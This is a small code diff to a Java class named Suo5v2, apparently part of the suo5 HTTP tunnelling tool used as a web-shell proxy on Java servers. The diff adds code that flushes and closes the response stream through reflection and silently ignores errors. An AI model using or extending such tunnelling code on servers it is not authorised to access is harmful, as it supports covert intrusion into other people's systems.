@@ -183,7 +183,11 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
             }
         } catch (Throwable ignored) {
         } finally {
-
+            try {
+                OutputStream out = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
+                out.flush();
+                out.close();
+            } catch (Throwable ignore) {}
         }
     }
 
